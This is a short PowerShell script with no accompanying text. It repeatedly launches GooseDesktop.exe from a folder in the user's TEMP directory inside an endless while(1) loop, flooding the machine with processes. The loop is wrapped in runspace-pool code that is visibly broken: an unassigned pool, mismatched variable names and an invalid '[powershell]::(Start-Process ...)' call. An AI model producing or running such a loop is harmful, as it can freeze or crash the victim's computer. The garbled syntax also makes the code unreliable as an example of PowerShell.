$file="$env:TMP"+'\dg\GooseDesktop.exe'
while (1) {$NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(Start-Process -FilePath "$file");;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke()}
